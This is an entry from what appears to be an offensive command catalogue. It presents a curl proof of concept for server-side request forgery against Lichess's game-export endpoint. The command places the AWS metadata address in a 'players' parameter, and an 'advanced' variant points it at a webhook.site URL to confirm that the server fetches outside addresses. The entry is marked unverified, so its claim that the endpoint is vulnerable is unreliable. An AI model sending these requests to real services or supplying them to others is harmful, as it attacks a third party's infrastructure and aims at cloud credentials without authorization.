---
id: cmd-curl-ssrf-001
data: >-
  curl
  "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/"
  -v
tags:
  - ssrf
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.685Z'
verified: false
validated: true
submitted: true
---
# curl-lichess-ssrf-poc

## Command

```bash
curl "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/" -v
```

## Description

This curl command sends a GET request to Lichess's game export endpoint with a malicious 'players' parameter pointing to AWS metadata, exploiting SSRF to force the server to fetch internal resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[GAME_ID]` | Valid Lichess game ID (e.g., from public games) | Yes |
| `?players=...` | Arbitrary URL for SSRF target (e.g., internal metadata) | Yes |
| `-v` | Verbose output for debugging | No |

## Examples

### Basic Usage

```bash
curl "https://lichess.org/game/export/ulB8gJ1k?players=http://169.254.169.254/latest/meta-data/" -v
```

### Advanced Usage (with Webhook Confirmation)

```bash
curl "https://lichess.org/game/export/ulB8gJ1k?players=https://webhook.site/unique-id" -v
```

## Expected Output

HTTP/1.1 200 OK response with game export data (PGN format), but verbose logs show connection details. Success is confirmed via backend fetch (e.g., webhook hit or logs).

## Related

- [[Related Procedure: Craft-and-Execute-Lichess-SSRF-POC-Request]]
